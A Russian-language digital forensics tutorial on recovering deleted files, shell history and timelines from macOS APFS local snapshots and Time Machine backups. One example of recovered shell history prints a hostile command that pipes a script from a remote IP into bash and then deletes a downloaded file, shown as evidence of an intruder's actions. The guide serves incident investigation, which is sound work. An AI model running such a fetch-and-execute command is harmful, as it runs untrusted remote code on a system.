## Вопрос, с которого всё начинается

Файл удалён, диск зашифрован, индексы подчищены. Но macOS **сама** хранит снимки:
локальные снимки APFS и бэкапы Time Machine. Из них можно достать версии файлов,
которых уже нет. Это один из самых недооценённых источников.

## Наш пример: локальный снимок

## Шаг 1: список локальных снимков

```
$ tmutil listlocalsnapshots /
com.apple.TimeMachine.2026-01-14-020000.local
com.apple.TimeMachine.2026-01-14-030000.local
```

Локальные снимки создаются ежечасно и хранят состояние диска. Их можно монтировать
только для чтения.

## Шаг 2: монтируем снимок

```
$ mkdir /tmp/snap
$ mount_apfs -s com.apple.TimeMachine.2026-01-14-030000.local / /tmp/snap
$ ls /tmp/snap/Users/user/Downloads/
payload.dmg
```

Мы видим файл `payload.dmg`, который в текущей системе, возможно, уже удалён. Снимок
зафиксировал состояние на 03:00.

## Шаг 3: сравниваем версии

```
$ diff /tmp/snap/Users/user/.bash_history ~/.bash_history
```

Разница покажет, что злоумышленник дописал (или удалил) после снимка. Это прямые улики.

## Шаг 4: внешний Time Machine

Если есть внешний диск:

```
$ tmutil listbackups
/Volumes/Backup/Backups.backupdb/mac/2026-01-14-030000
$ tmutil compare
```

Бэкапы хранят историю за недели. Из них восстанавливают и файлы, и целые системы.

## Шаг 5: что это даёт

- **удалённые файлы** — версии из снимка;
- **timestomping** — сравнение меток между снимками;
- **история правок** — что менялось между снимками;
- **доказательство** — снимок нельзя изменить задним числом.

## Что мы теперь знаем

- macOS хранит локальные снимки APFS ежечасно.
- `tmutil listlocalsnapshots` и `mount_apfs` дают доступ.
- Внешние бэкапы Time Machine хранят историю за недели.
- Сравнение версий ловит удаления и подделки.
- Снимки — доказательство, которое трудно подделать.

## Если не сработало

- Снимков нет? Проверь `tmutil listlocalsnapshots` по всем томам.
- Снимок повреждён? Пробуй соседние.
- Нужен бэкап с другого Mac? Смотри `Backups.backupdb`.

## Практический разбор: восстановление файла из снимка

Локальные снимки APFS позволяют вернуть файл на момент создания. Найдём нужный
снимок и смонтируем его:

```bash
$ tmutil listlocalsnapshots /
com.apple.TimeMachine.2026-01-14-020000.local
com.apple.TimeMachine.2026-01-14-030000.local
$ mkdir /tmp/snap && mount_apfs -s com.apple.TimeMachine.2026-01-14-030000.local / /tmp/snap
$ ls -la /tmp/snap/Users/user/Downloads/
-rw-r--r-- 1 user staff 5242880 payload.dmg
```

Файл `payload.dmg` в текущей системе удалён, но снимок его сохранил. Копируем
его, размонтируем снимок и проверяем:

```bash
$ cp /tmp/snap/Users/user/Downloads/payload.dmg /tmp/evidence/
$ umount /tmp/snap
$ shasum -a 256 /tmp/evidence/payload.dmg
```

Так восстанавливают удалённые образцы и документы, которые злоумышленник
пытался стереть.

## APFS и его особенности

| Свойство | Значение для форензики |
|---|---|
| Copy-on-write | старые блоки сохраняются в снимках |
| Снимки | состояние тома на момент времени |
| Клоны | несколько имён на одни данные |
| Шифрование | том/файл, ключ в Keychain/T2 |
| Пространство | свободное место переиспользуется |

Copy-on-write означает, что изменение файла не перезаписывает старые блоки, а
создаёт новые — поэтому снимок содержит предыдущее состояние. Это делает APFS
дружелюбным к восстановлению, если снимок существует.

## Практический разбор: внешние бэкапы и сравнение

Если подключён внешний диск Time Machine, он хранит историю за недели.
Перечислим доступные бэкапы и сравним текущее состояние с прошлым:

```bash
$ tmutil listbackups
/Volumes/Backup/Backups.backupdb/mac/2026-01-14-030000
/Volumes/Backup/Backups.backupdb/mac/2026-01-13-030000
$ tmutil compare -s
+ 5.2 MB  /Users/user/Library/LaunchAgents/com.bad.plist
- 1.1 MB  /Users/user/Documents/report.docx
```

Вывод `tmutil compare` показывает, что появилось (`+`) и что исчезло (`-`)
между бэкапами. Появление LaunchAgent и исчезновение документа — прямые улики.
Для точечного восстановления монтируют конкретный бэкап и копируют файл.

## Таймстемпы и доказательная ценность

Снимки фиксируют временные метки, которые трудно подделать задним числом:

- **Время создания снимка.** Известно и не зависит от файлов.
- **Метки файлов внутри.** Сравнение меток между снимками выявляет
  timestomping: если файл «создан» раньше снимка, где его не было, — время
  подделано.
- **История правок.** `diff` между снимками показывает, что именно менялось.

```bash
$ diff -r /tmp/snap_0300/Users/user /tmp/snap_0200/Users/user | head
Only in /tmp/snap_0300/.../LaunchAgents: com.bad.plist
```

Снимок — это доказательство, которое сложно изменить незаметно, потому что он
создаётся системой автоматически.

## Чек-лист работы со снимками macOS

1. Перечисли локальные снимки по всем томам (`tmutil listlocalsnapshots`).
2. Смонтируй нужный снимок только для чтения (`mount_apfs -s`).
3. Скопируй целевые файлы в хранилище доказательств.
4. Сравни версии (`diff`) для выявления правок и удалений.
5. Проверь внешние бэкапы (`tmutil listbackups`, `tmutil compare`).
6. Сопоставь временные метки между снимками (timestomping).
7. Посчитай хэши восстановленного.
8. Размонтируй снимок и задокументируй шаги.

## Ограничения метода

- **Нет снимков.** Если Time Machine выключен, локальных снимков может не быть.
- **Ротация.** macOS удаляет старые локальные снимки при нехватке места.
- **Шифрование.** Шифрованный том требует ключа для монтирования снимка.
- **Повреждение.** Снимок может быть повреждён; тогда пробуют соседние.
- **Пространство.** Снимки занимают место и могут быть вытеснены.

## Связь с другими артефактами

- **FSEvents.** Журнал изменений ФС дополняет снимки: он показывает каждое
  событие, а снимки — состояние.
- **Unified Log.** Системные сообщения привязывают действия к процессам.
- **Карантин.** Атрибуты загрузки связывают файл с источником.
- **Keychain.** Восстановленные секреты могут лежать в связке ключей.

Снимки — самый надёжный источник «прошлого состояния» системы, но работать с
ними нужно только для чтения.

## Практический разбор: анализ удалённых файлов через снимки

Снимки позволяют увидеть файлы, удалённые после их создания. Найдём разницу
между текущей системой и снимком:

```bash
$ mount_apfs -s com.apple.TimeMachine.2026-01-14-020000.local / /tmp/snap
$ diff <(ls /tmp/snap/Users/user/Desktop/) <(ls ~/Desktop/)
2d1
< evidence.docx
```

Файл `evidence.docx` был на рабочем столе в 02:00, но исчез к текущему моменту.
Восстанавливаем его из снимка:

```bash
$ cp /tmp/snap/Users/user/Desktop/evidence.docx /tmp/evidence/
```

Аналогично восстанавливают удалённые `.bash_history`, LaunchAgents и загруженные
образцы — всё, что злоумышленник пытался стереть.

## Автоматизация и скрипты

- **Перечисление снимков.** `tmutil listlocalsnapshots /` по всем томам.
- **Массовое монтирование.** Цикл по снимкам с монтированием только для чтения.
- **Сравнение версий.** `diff -r` между снимками и текущим состоянием.
- **Извлечение.** Копирование найденных файлов с подсчётом хэшей.
- **Отчёт.** Список восстановленного с путями и временами.

```bash
$ for s in $(tmutil listlocalsnapshots / | grep -o 'com.apple.*'); do
    echo "== $s"; mount_apfs -s "$s" / /tmp/s_$s 2>/dev/null; done
```

Скрипт даёт быстрый обзор всех доступных состояний диска.

## Частые заблуждения

- «Удалённый файл потерян навсегда» — снимок APFS может его сохранить.
- «Снимки меняются задним числом» — они создаются системой автоматически, что
  повышает их доказательную ценность.
- «Внешний бэкап не нужен» — локальные снимки вытесняются, а внешние хранят
  историю неделями.
- «Монтировать можно для записи» — снимки монтируются только для чтения, и это
  защищает доказательство.

- **FSEvents.** Журнал изменений ФС даёт каждое событие, а снимки — состояние.
- **Unified Log.** Системные сообщения привязывают действия к процессам.

Снимки и FSEvents вместе дают наиболее полную картину изменений файловой

## Практический разбор: анализ истории команд

История shell — один из самых ценных артефактов, и снимок может сохранить
удалённые строки. Сравним версии `.bash_history`:

```bash
$ diff /tmp/snap/Users/user/.bash_history ~/.bash_history
< curl -s http://203.0.113.5/x | bash
< rm -rf ~/Downloads/payload.dmg
```

Строки, отсутствующие в текущем файле, но присутствующие в снимке, — это то,
что злоумышленник стёр. Такие находки напрямую восстанавливают действия.

## Таблица артефактов истории

| Артефакт | Путь | Данные |
|---|---|---|
| bash_history | `~/.bash_history` | команды bash |
| zsh_history | `~/.zsh_history` | команды zsh |
| Fish | `~/.local/share/fish/` | команды fish |
| Terminal state | `~/Library/Saved Application State/` | сессии |
| Quarantine | `xattr` | источник загрузки |

Комбинация истории команд, карантина и сетевых логов восстанавливает цепочку
действий: что скачали, чем запустили и куда обратились.

## Что записать в отчёт

- Восстановленные команды и время выполнения.
- Источник (снимок/бэкап) и метод восстановления.
- Связь команд с сетевыми обращениями и загруженными файлами.
- Ограничения: ротация снимков, шифрование тома.

## Практический разбор: снимки как источник таймлайна

Снимки создаются ежечасно, поэтому их набор — это готовый ряд состояний. Собрав
различия между последовательными снимками, получают детальный таймлайн
изменений:

```bash
$ for i in 020000 030000 040000; do
    mount_apfs -s com.apple.TimeMachine.2026-01-14-$i.local / /tmp/s$i
  done
$ diff -r /tmp/s020000/Users/user /tmp/s030000/Users/user
```

Каждая разница — событие с известным временным окном (между двумя снимками).
Это позволяет локализовать момент заражения с точностью до часа, даже если
системные логи усечены.

## Ограничения и типичные ошибки

- **Ротация снимков.** macOS удаляет старые локальные снимки при нехватке
  места, поэтому «глубина» истории не гарантирована.
- **Монтирование только для чтения.** Любая попытка записи в снимок искажает
  доказательство.
- **Шифрованный том.** Без ключа снимок не смонтировать, а данные недоступны.
- **Только локально.** Снимки не заменяют внешний бэкап: они живут на том же
  диске и гибнут вместе с ним.
